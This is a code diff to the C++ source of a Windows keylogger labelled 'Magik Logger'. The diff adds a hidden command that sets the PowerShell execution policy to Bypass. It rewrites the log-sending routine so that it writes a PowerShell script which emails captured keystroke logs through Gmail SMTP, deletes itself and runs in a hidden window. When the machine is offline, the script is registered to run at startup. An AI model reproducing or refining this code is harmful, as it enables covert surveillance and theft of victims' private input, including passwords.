@@ -33,9 +33,8 @@ typedef std::string String;
 typedef std::vector<String> StringVector;
 typedef unsigned long long uint64_t;
 
-#define User ""
-#define Password ""
-#define MyServer ""
+//------------------------------------------------------
+// Customization
 
 #define CharactersPerLog 300
 #define MaximumFolderSize 10 
@@ -44,9 +43,11 @@ typedef unsigned long long uint64_t;
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
 #define SecondsBetweenScreenshots 20000
-#define SendersEmail "YourEmail"
-#define SendersPsw "YourPassword"
-#define RecieversEmail "YourEmail2"
+#define SendersEmail "Example1@gmail.com"
+#define SendersPsw "Example1Password"
+#define RecieversEmail "Example2@gmail.com"
+
+//------------------------------------------------------
 
 #define MAX_LENGTH 1024
 
@@ -126,7 +127,9 @@ int main()
     bool FirstLog = true;
 
     unsigned long ThreadId2;
-    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+    //CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+
+    ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
 
 Log:
 
@@ -975,11 +978,7 @@ void LogItChar(std::string Value, std::string FileName) {
 }
 
 void SendLog(std::string CurrentLog) {
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+    std::string Command = "/C powershell ";
     DWORD WrittenBytes, DWFlags;
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -991,32 +990,26 @@ void SendLog(std::string CurrentLog) {
     std::string PSStartup = "MagikMailer";
     PSStartup += std::to_string(GetTickCount());
     HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    std::string a = "$online = test - connection 8.8.8.8 - Count 1 - Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New - Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('";
-    std::string b = "', '";
-    std::string c = "')\n$ReportEmail = New - Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-    std::string d = "'\n$ReportEmail.To.Add('";
-    std::string e = "')$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
-    std::string f = "')\n$SMTPInfo.Send($ReportEmail)\nRemove - Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
+    std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
+    a += SendersEmail;
+    a += "', '";
+    a += SendersPsw;
+    a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
+    a += SendersEmail;
+    a += "'\n$ReportEmail.To.Add('";
+    a += RecieversEmail;
+    a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
+    a += CurrentLog.c_str();
+    a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
     WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, SendersEmail, (DWORD)strlen(SendersEmail), &WrittenBytes, NULL);
-    WriteFile(PS1File, b.c_str(), (DWORD)strlen(b.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, SendersPsw, (DWORD)strlen(SendersPsw), &WrittenBytes, NULL);
-    WriteFile(PS1File, c.c_str(), (DWORD)strlen(c.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, SendersEmail, (DWORD)strlen(SendersEmail), &WrittenBytes, NULL);
-    WriteFile(PS1File, d.c_str(), (DWORD)strlen(d.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, RecieversEmail, (DWORD)strlen(RecieversEmail), &WrittenBytes, NULL);
-    WriteFile(PS1File, e.c_str(), (DWORD)strlen(e.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, CurrentLog.c_str(), (DWORD)strlen(CurrentLog.c_str()), &WrittenBytes, NULL);
-    WriteFile(PS1File, f.c_str(), (DWORD)strlen(f.c_str()), &WrittenBytes, NULL);
     CloseHandle(PS1File);
+    Command += Powershell;
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
         LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
         RegisterMyProgramForStartup(PSStartup.c_str(), Powershell.c_str(), "");
     }else{
         LogItChar("Connected to the internet, sending the log...", CurrentLog);
-        CreateProcessA(Powershell.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
     }
 }
 
